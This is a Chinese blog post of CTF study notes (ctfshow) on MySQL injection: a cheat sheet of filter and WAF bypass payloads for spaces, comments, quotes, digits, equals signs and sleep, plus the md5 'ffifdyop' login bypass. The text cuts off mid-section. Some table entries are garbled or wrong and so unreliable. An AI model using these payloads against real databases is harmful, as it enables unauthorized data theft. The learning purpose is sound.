<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>sql注入 | wanyanblog</title><meta name="author" content="wan yan"><meta name="copyright" content="wan yan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sql注入执行顺序    顺序 关键字 含义与攻防要点    1 FROM 确定表或子查询来源（注入点常见于表别名、子查询）   2 JOIN &#x2F; ON 联表条件（逻辑可控时可用 UNION&#x2F;FUZZ 触发错误或盲注）   3 WHERE 行级过滤（布尔盲注&#x2F;时间盲注&#x2F;报错注入常驻地）   4 GROUP BY 分组，常与 HAVING 配合注入   5 H"><meta property="og:type" content="article"><meta property="og:title" content="sql注入"><meta property="og:url" content="https://blog.wanyanai.top/2025/06/02/ctfshow/sql%E6%B3%A8%E5%85%A5/index.html"><meta property="og:site_name" content="wanyanblog"><meta property="og:description" content="sql注入执行顺序    顺序 关键字 含义与攻防要点    1 FROM 确定表或子查询来源（注入点常见于表别名、子查询）   2 JOIN &#x2F; ON 联表条件（逻辑可控时可用 UNION&#x2F;FUZZ 触发错误或盲注）   3 WHERE 行级过滤（布尔盲注&#x2F;时间盲注&#x2F;报错注入常驻地）   4 GROUP BY 分组，常与 HAVING 配合注入   5 H"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://blog.wanyanai.top/img/content.png"><meta property="article:published_time" content="2025-06-02T10:00:00.000Z"><meta property="article:modified_time" content="2025-06-02T14:03:21.965Z"><meta property="article:author" content="wan yan"><meta property="article:tag" content="ctfshow"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://blog.wanyanai.top/img/content.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "sql注入",
  "url": "https://blog.wanyanai.top/2025/06/02/ctfshow/sql%E6%B3%A8%E5%85%A5/",
  "image": "https://blog.wanyanai.top/img/content.png",
  "datePublished": "2025-06-02T10:00:00.000Z",
  "dateModified": "2025-06-02T14:03:21.965Z",
  "author": [
    {
      "@type": "Person",
      "name": "wan yan",
      "url": "https://blog.wanyanai.top/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/wanyan.jpg"><link rel="canonical" href="https://blog.wanyanai.top/2025/06/02/ctfshow/sql%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>(() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"sql注入",isHighlightShrink:!1,isToc:!0,pageType:"post"}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image:url(/img/background.jpg)"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/wanyan.jpg" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span>首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span>分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span>标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span>归档</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><span>搜索</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(/img/content.png)"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">wanyanblog</span></a><a class="nav-page-title" href="/"><span class="site-name">sql注入</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span>首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span>分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span>标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span>归档</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><span>搜索</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">sql注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-02T10:00:00.000Z" title="发表于 2025-06-02 18:00:00">2025-06-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-02T14:03:21.965Z" title="更新于 2025-06-02 22:03:21">2025-06-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>执行顺序</p><table><thead><tr><th>顺序</th><th>关键字</th><th>含义与攻防要点</th></tr></thead><tbody><tr><td>1</td><td><code>FROM</code></td><td>确定表或子查询来源（注入点常见于表别名、子查询）</td></tr><tr><td>2</td><td><code>JOIN</code> &#x2F; <code>ON</code></td><td>联表条件（逻辑可控时可用 UNION&#x2F;FUZZ 触发错误或盲注）</td></tr><tr><td>3</td><td><code>WHERE</code></td><td>行级过滤（布尔盲注&#x2F;时间盲注&#x2F;报错注入常驻地）</td></tr><tr><td>4</td><td><code>GROUP BY</code></td><td>分组，常与 <code>HAVING</code> 配合注入</td></tr><tr><td>5</td><td><code>HAVING</code></td><td>分组后的过滤（绕过 WAF 替代 WHERE）</td></tr><tr><td>6</td><td><code>SELECT</code></td><td>指定查询字段（可构造 <code>select sleep(3)</code> 或 <code>select updatexml(...)</code> 等）</td></tr><tr><td>7</td><td><code>DISTINCT</code></td><td>去重，对结果影响较大，攻击中不常利用</td></tr><tr><td>8</td><td><code>ORDER BY</code></td><td>排序（布尔盲注中可用排序条件泄露差异）</td></tr><tr><td>9</td><td><code>LIMIT</code></td><td>限制返回数量（配合联合注入可用）</td></tr></tbody></table><table><thead><tr><th>关键字</th><th>攻击常用点</th><th>备注</th></tr></thead><tbody><tr><td><code>SELECT</code></td><td>暴露字段、构造 payload</td><td><code>select user(),database()</code> 等</td></tr><tr><td><code>FROM</code></td><td>子查询注入点、库名控制</td><td>子查询中 <code>from(select(...))</code> 常用</td></tr><tr><td><code>JOIN ON</code></td><td>构造逻辑绕过</td><td>rarely used，但可配合注入</td></tr><tr><td><code>WHERE</code></td><td>盲注、报错主战场</td><td><code>WHERE 1=1 and updatexml(...)</code></td></tr><tr><td><code>GROUP BY</code></td><td>为 <code>HAVING</code> 绕过铺路</td><td>绕过 <code>WHERE</code> 关键词检测</td></tr><tr><td><code>HAVING</code></td><td>替代 WHERE</td><td>例如 <code>HAVING 1=1</code> 绕WAF</td></tr><tr><td><code>UNION</code></td><td>联合注入核心</td><td><code>UNION SELECT 1,2,3</code> 爆字段</td></tr><tr><td><code>ORDER BY</code></td><td>猜字段数 &#x2F; 触发排序盲注</td><td><code>ORDER BY 1</code>，多用于布尔盲注</td></tr><tr><td><code>LIMIT</code></td><td>限制数据回显</td><td>控制数据精度，配合 <code>OFFSET</code></td></tr></tbody></table><h3 id="常见过滤绕过"><a href="#常见过滤绕过" class="headerlink" title="常见过滤绕过:"></a>常见过滤绕过:</h3><h4 id="1-对空格的绕过"><a href="#1-对空格的绕过" class="headerlink" title="1.对空格的绕过:"></a>1.对空格的绕过:</h4><p>也可以用()括号，绕过空格</p><table><thead><tr><th>绕过方式</th><th>替代表达</th><th>说明</th></tr></thead><tbody><tr><td><code>%09</code></td><td>制表符（Tab）</td><td><code>select%09*%09from</code></td></tr><tr><td><code>%0a</code></td><td>换行符（\n）</td><td><code>select%0a*%0afrom</code></td></tr><tr><td><code>%0b</code></td><td>垂直制表符</td><td>有些解析器可用</td></tr><tr><td><code>%0c</code></td><td>换页符</td><td>用得少但有效</td></tr><tr><td><code>%0d</code></td><td>回车符（\r）</td><td>Windows常见</td></tr><tr><td><code>/**/</code></td><td>SQL注释</td><td><code>select/**//*/**/from</code></td></tr><tr><td><code>+</code></td><td>URL 编码中空格</td><td><code>select+*+from</code>（仅限部分环境）</td></tr><tr><td><code>/*!*/</code></td><td>MySQL特有注释执行</td><td><code>select/*!00000*/from</code></td></tr><tr><td><code>\x0a</code>~&#96;\x0d&#96;</td><td>字节级替代</td><td>特定语言解析器有效</td></tr><tr><td><code>0x20</code></td><td>空格的 hex</td><td>数据中拼接时用</td></tr></tbody></table><h4 id="2-对–-和-的过滤"><a href="#2-对–-和-的过滤" class="headerlink" title="2.对–+和#的过滤:"></a>2.对–+和#的过滤:</h4><table><thead><tr><th>绕过方式</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td><code>%23</code></td><td><code>#</code> → <code>%23</code></td><td>URL 编码</td></tr><tr><td><code>%2d%2d</code></td><td><code>--</code> → <code>%2d%2d</code></td><td>URL 编码绕过</td></tr><tr><td>空格注释变种</td><td><code>--\n</code>, <code>--\r</code>, <code>--\t</code></td><td>非 <code>--+</code> 写法尝试</td></tr><tr><td>字符拆解</td><td><code>- -</code>, <code>--</code></td><td>分隔或双引号包含干扰识别</td></tr><tr><td>多行注释终止</td><td><code>/* 注释 */</code></td><td>安全可靠，推荐使用</td></tr><tr><td>多余逻辑结束</td><td><code>&#39;or&#39;1&#39;=&#39;1&#39;</code></td><td>直接闭合，无需注释</td></tr><tr><td>–%0c或者–%01</td><td></td><td></td></tr></tbody></table><h4 id="3-对where的替代"><a href="#3-对where的替代" class="headerlink" title="3.对where的替代:"></a>3.对where的替代:</h4><h5 id="1-使用having"><a href="#1-使用having" class="headerlink" title="1.使用having :"></a>1.使用having :</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> user_count</span><br><span class="line"><span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> username</span><br><span class="line"><span class="keyword">HAVING</span> user_count <span class="operator">&gt;</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">表名 <span class="keyword">group</span> <span class="keyword">by</span> 查询的数据 <span class="keyword">having</span> 添加条件，只返回符合条件的数据</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-使用regexp"><a href="#2-使用regexp" class="headerlink" title="2.使用regexp:"></a>2.使用regexp:</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">表名 <span class="keyword">group</span> <span class="keyword">by</span> 查询的数据 <span class="keyword">having</span> regexp  ，只返回符合条件的数据</span><br><span class="line"><span class="string">&#x27; AND (SELECT 字段 FROM 表名 LIMIT 0,1) REGEXP &#x27;</span> <span class="string">&#x27; -- </span></span><br><span class="line"><span class="string">regexp和like的区别:</span></span><br><span class="line"><span class="string">       like ctfshow&#123;%      --必须增加%作为匹配</span></span><br><span class="line"><span class="string">       regexp ctfshow&#123;     --可以加^或者不加</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">项目</th><th align="left">内容</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">作用</td><td align="left"><strong>用正则表达式匹配字符串</strong></td><td align="left"><code>WHERE username REGEXP &#39;^admin&#39;</code></td></tr><tr><td align="left">匹配规则</td><td align="left">只要<strong>部分内容匹配</strong>就算成功，不是要求全字段完全一致！</td><td align="left"><code>&#39;ctfshow&#123;123&#125;&#39;</code> 匹配到<code>&#39;ctfshow&#39;</code>也算成功</td></tr><tr><td align="left">大小写敏感？</td><td align="left"><strong>不敏感</strong>（MySQL默认情况下）</td><td align="left"><code>REGEXP &#39;CTF&#39;</code>可以匹配<code>ctfshow</code></td></tr><tr><td align="left">匹配字符</td><td align="left"><strong>单字符&#x2F;多字符</strong>均可</td><td align="left"><code>REGEXP &#39;c&#39;</code> 匹配到 <code>ctfshow</code></td></tr><tr><td align="left">正则语法</td><td align="left">类似常规正则，但MySQL支持的是<strong>简化版</strong></td><td align="left">比如<code>^</code>、<code>$</code>、<code>[abc]</code>、<code>.</code>、<code>*</code>、<code>+</code>等</td></tr><tr><td align="left">多模式支持</td><td align="left">可以用&#96;</td><td align="left">&#96;符号，表示<strong>或</strong>匹配</td></tr><tr><td align="left">特殊字符</td><td align="left">部分正则特殊符号要加转义（如<code>.</code>，<code>*</code>）</td><td align="left"><code>REGEXP &#39;\\.&#39;</code> 匹配真正的小数点</td></tr><tr><td align="left">空字符串</td><td align="left"><code>&#39;&#39; REGEXP &#39;a&#39;</code> ➔ 返回<code>false</code>（空的不匹配任何字符）</td><td align="left">-</td></tr></tbody></table><table><thead><tr><th align="left">正则符号</th><th align="left">意义</th><th align="left">示例</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>.</code></td><td align="left">匹配<strong>任意单个字符</strong></td><td align="left"><code>&#39;a.b&#39;</code> ➔ <code>acb</code>, <code>a1b</code>, <code>a-b</code>都匹配</td><td align="left"></td></tr><tr><td align="left"><code>*</code></td><td align="left"><strong>前一个字符重复0次或多次</strong></td><td align="left"><code>&#39;ab*c&#39;</code> ➔ <code>ac</code>, <code>abc</code>, <code>abbbc</code>都匹配</td><td align="left"></td></tr><tr><td align="left"><code>+</code></td><td align="left"><strong>前一个字符重复1次或多次</strong></td><td align="left"><code>&#39;ab+c&#39;</code> ➔ <code>abc</code>, <code>abbbc</code>匹配，但<code>ac</code>不匹配</td><td align="left"></td></tr><tr><td align="left"><code>?</code></td><td align="left"><strong>前一个字符出现0次或1次</strong></td><td align="left"><code>&#39;ab?c&#39;</code> ➔ <code>ac</code>, <code>abc</code>匹配</td><td align="left"></td></tr><tr><td align="left">&#96;</td><td align="left">&#96;</td><td align="left"><strong>或</strong>，满足任一模式即可</td><td align="left">&#96;’abc</td></tr><tr><td align="left"><code>[]</code></td><td align="left"><strong>字符集合</strong>，匹配其中任意一个</td><td align="left"><code>&#39;[abc]&#39;</code> 匹配a或b或c</td><td align="left"></td></tr><tr><td align="left"><code>[^]</code></td><td align="left"><strong>取反字符集合</strong></td><td align="left"><code>&#39;[^abc]&#39;</code> 匹配除了a&#x2F;b&#x2F;c之外的字符</td><td align="left"></td></tr><tr><td align="left"><code>^</code></td><td align="left">匹配<strong>开头</strong></td><td align="left"><code>&#39;^ctf&#39;</code> 匹配以<code>ctf</code>开头</td><td align="left"></td></tr><tr><td align="left"><code>$</code></td><td align="left">匹配<strong>结尾</strong></td><td align="left"><code>&#39;ctf$&#39;</code> 匹配以<code>ctf</code>结尾</td><td align="left"></td></tr></tbody></table><table><thead><tr><th align="left">场景</th><th align="left">使用方式</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">爆破flag</td><td align="left">构造正则判断一位字符是否正确</td><td align="left"><code>having pass regexp &#39;^c&#39;</code></td></tr><tr><td align="left">绕过WAF</td><td align="left">把payload变复杂，避开简单检测</td><td align="left"><code>regexp(concat(char(...)))</code></td></tr><tr><td align="left">盲注猜数据</td><td align="left">通过正则变化，逐字符爆破</td><td align="left">正则从头匹配flag字符</td></tr></tbody></table><h4 id="4-对’’字符串的绕过-字符串拼接"><a href="#4-对’’字符串的绕过-字符串拼接" class="headerlink" title="4.对’’字符串的绕过,字符串拼接:"></a>4.对’’字符串的绕过,字符串拼接:</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用字符串拼接，得到的只是字符串，不会执行</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>x开头的十六进制字面量，在MySQL中自动解释为字符串 </span><br><span class="line"><span class="number">0x63746673686f777b25</span> <span class="operator">=</span> <span class="string">&#x27;ctfshow&#123;%&#x27;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>方法</th><th>说明</th><th>示例</th><th>是否推荐</th></tr></thead><tbody><tr><td><code>CONCAT()</code></td><td>字符串拼接</td><td><code>CONCAT(&#39;s&#39;,&#39;elect&#39;)</code></td><td>✅ 推荐，兼容性高</td></tr><tr><td><code>CONCAT_WS()</code></td><td>自带分隔符拼接</td><td><code>CONCAT_WS(&#39;&#39;, &#39;s&#39;,&#39;elect&#39;)</code></td><td>✅ 更隐蔽</td></tr><tr><td><code>CHAR()</code></td><td>以ASCII构造字符</td><td><code>CHAR(115,101,108,101,99,116)</code></td><td>✅ 强绕过能力</td></tr><tr><td><code>0x</code>十六进制</td><td>直接用16进制</td><td><code>0x73656c656374</code></td><td>✅ WAF绕过首选之一</td></tr><tr><td><code>ELT()/FIELD()</code></td><td>字符选择构造</td><td><code>ELT(1,&#39;select&#39;,&#39;union&#39;)</code></td><td>⚠️ 有技巧</td></tr><tr><td><code>REPEAT()/LPAD()/RPAD()</code></td><td>利用字符串函数拼接关键字</td><td><code>REPEAT(&#39;sel&#39;,1) + REPEAT(&#39;ect&#39;,1)</code></td><td>⚠️ 有局限</td></tr><tr><td><code>CONV(N,10,36)</code></td><td>进制转换得到关键字</td><td><code>CONV(1234567,10,36)</code> → <code>select</code></td><td>⚠️ 可用，但不直观</td></tr><tr><td><code>MID()/SUBSTRING()</code></td><td>子串拼接组合</td><td><code>MID(&#39;selectfrom&#39;,1,6)</code></td><td>⚠️ 少用</td></tr><tr><td><code>GROUP_CONCAT()</code></td><td>聚合拼接（配合盲注）</td><td><code>GROUP_CONCAT(schema_name)</code></td><td>✅ 在盲注中常用</td></tr><tr><td><code>CASE WHEN THEN</code></td><td>拼接关键字条件构造</td><td><code>CASE WHEN 1 THEN &#39;sel&#39; ELSE &#39;foo&#39; END</code></td><td>⚠️ 绕过防护场景用</td></tr></tbody></table><h4 id="5-对数字的过滤-："><a href="#5-对数字的过滤-：" class="headerlink" title="5.对数字的过滤 ："></a>5.对数字的过滤 ：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">false</span>	                         <span class="number">0</span></span><br><span class="line"><span class="literal">true</span>	                         <span class="number">1</span></span><br><span class="line"><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span>	                     <span class="number">2</span></span><br><span class="line"><span class="built_in">floor</span>(pi())	                     <span class="number">3</span></span><br><span class="line"><span class="built_in">ceil</span>(pi())	                     <span class="number">4</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">+</span><span class="literal">true</span>	             <span class="number">5</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">+</span><span class="built_in">floor</span>(pi())	         <span class="number">6</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">+</span><span class="built_in">ceil</span>(pi())	         <span class="number">7</span></span><br><span class="line"><span class="built_in">ceil</span>(pi())<span class="operator">+</span><span class="built_in">ceil</span>(pi())	         <span class="number">8</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">*</span><span class="built_in">floor</span>(pi())	         <span class="number">9</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">*</span><span class="built_in">floor</span>(pi())<span class="operator">+</span><span class="literal">true</span>	<span class="number">10</span></span><br></pre></td></tr></table></figure><h4 id="6-对输入的数据md5"><a href="#6-对输入的数据md5" class="headerlink" title="6. 对输入的数据md5()"></a>6. 对输入的数据md5()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$password <span class="operator">=</span> md5($_POST[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line">      <span class="comment">--如果可选的binary被设置为true 那么md5摘要将以16字符长度的原始二进制格式返回</span></span><br><span class="line">md5(&quot;ffifdyop&quot;,<span class="literal">true</span>) <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;or&#x27;</span><span class="number">6</span>É]é<span class="operator">!</span>r,ùíb</span><br></pre></td></tr></table></figure><h4 id="7-mysql中字符串与数字进行比较"><a href="#7-mysql中字符串与数字进行比较" class="headerlink" title="7.mysql中字符串与数字进行比较:"></a>7.mysql中字符串与数字进行比较:</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以字母开头的字符串都会转换成数字<span class="number">0</span> </span><br></pre></td></tr></table></figure><h4 id="8-substr-函数的过滤"><a href="#8-substr-函数的过滤" class="headerlink" title="8.substr()函数的过滤:"></a>8.substr()函数的过滤:</h4><table><thead><tr><th>方法</th><th>替代语法</th><th>说明</th><th>是否推荐</th></tr></thead><tbody><tr><td>✅ <strong><code>mid()</code></strong></td><td><code>mid((SELECT f1ag...), 1, 1) = &#39;c&#39;</code></td><td>和 <code>substr</code> 完全一样</td><td>✅强推荐</td></tr><tr><td>✅ <strong><code>left()</code></strong></td><td><code>left((SELECT f1ag...), 1) = &#39;c&#39;</code></td><td>判断开头第1位</td><td>✅推荐</td></tr><tr><td>✅ <strong><code>like</code></strong></td><td><code>(SELECT f1ag...) LIKE &#39;c%&#39;</code></td><td>判断以 <code>c</code> 开头</td><td>✅推荐</td></tr><tr><td>✅ <strong><code>regexp</code></strong></td><td><code>(SELECT f1ag...) REGEXP &#39;^c&#39;</code></td><td>正则匹配开头</td><td>✅推荐</td></tr><tr><td>✅ <strong><code>ascii()</code></strong></td><td><code>ascii(mid((SELECT f1ag...), 1, 1)) = 99</code></td><td>判断字符 ASCII</td><td>✅适合盲注</td></tr><tr><td>✅ <strong><code>left(...) regexp</code></strong></td><td><code>left((SELECT ...), 3) REGEXP &#39;^ctf&#39;</code></td><td>混合正则判断前缀</td><td>✅推荐</td></tr></tbody></table><h4 id="9-对等号-的过滤"><a href="#9-对等号-的过滤" class="headerlink" title="9.对等号&#x3D;的过滤:"></a>9.对等号&#x3D;的过滤:</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th>替代形式</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td><code>LIKE</code></td><td><code>id LIKE 1</code></td><td>功能上与 <code>=</code> 相似，特别是在数值对比中可生效</td></tr><tr><td><code>IN</code></td><td><code>id IN (1)</code></td><td>在单值时等价于 <code>=</code>，但语法结构不同</td></tr><tr><td><code>BETWEEN</code></td><td><code>id BETWEEN 1 AND 1</code></td><td>等价于 <code>id = 1</code>，可绕过等号过滤</td></tr><tr><td><code>&gt; -1 AND id &lt; 2</code></td><td><code>id &gt; 0 AND id &lt; 2</code></td><td>逻辑等价于 <code>id = 1</code>，但更绕</td></tr><tr><td><code>NOT (id != 1)</code></td><td></td><td>等价于 <code>id = 1</code>，使用了逻辑反转</td></tr><tr><td><code>REGEXP &#39;^1$&#39;</code></td><td></td><td>正则匹配 1，可以替代 <code>=</code>，MySQL 专用</td></tr><tr><td><code>STRCMP(id, 1) = 0</code></td><td></td><td>字符串比较函数，结果为 0 表示相等</td></tr><tr><td><code>FIND_IN_SET(id, &#39;1&#39;)</code></td><td></td><td>如果 <code>id</code> 是 1，命中单元素列表</td></tr><tr><td><code>CASE WHEN id=1 THEN 1 ELSE 0 END</code></td><td></td><td>也可用于布尔判断绕过结构</td></tr><tr><td><code>BINARY</code></td><td><code>BINARY id LIKE BINARY 1</code></td><td>强制区分大小写，比对更严格，WAF可能绕不过但可混淆语义</td></tr></tbody></table><h4 id="10-对sleep的绕过"><a href="#10-对sleep的绕过" class="headerlink" title="10.对sleep的绕过;"></a>10.对sleep的绕过;</h4><table><thead><tr><th>方法</th><th>绕过 payload</th><th>说明</th></tr></thead><tbody><tr><td>✅ 编码函数</td><td><code>/*!sleep*/(3)</code></td><td>MySQL 会解析 <code>/*!...*/</code> 语法注释（版本条件注释）</td></tr><tr><td>✅ 分隔符拼接</td><td><code>sl/**/eep(3)</code></td><td>利用 SQL 注释分隔关键字</td></tr><tr><td>✅ 大小写变形</td><td><code>sLeEp(3)</code></td><td>如果没有 <code>i</code> 选项会绕过（此例不可行）</td></tr><tr><td>✅ 字符串拼接</td><td>&#96;s’</td><td></td></tr><tr><td>✅ 使用 HEX</td><td><code>0x736c656570</code></td><td><code>&#39;sleep&#39;</code> 的 hex 编码，不直接触发 regex</td></tr><tr><td>✅ 使用变量定义</td><td><code>@s:=&#39;sleep&#39;, @s(3)</code></td><td>如果 SQL 支持变量调用函数（MySQL支持有限）</td></tr><tr><td>✅ 利用其他延迟函数</td><td><code>benchmark(99999999,MD5(1))</code></td><td>替代 sleep 达成盲注延时效果</td></tr></tbody></table><h4 id="11-使用预处理语句执行字符串"><a href="#11-使用预处理语句执行字符串" class="headerlink" title="11.使用预处理语句执行字符串:"></a>11.使用预处理语句执行字符串:</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在 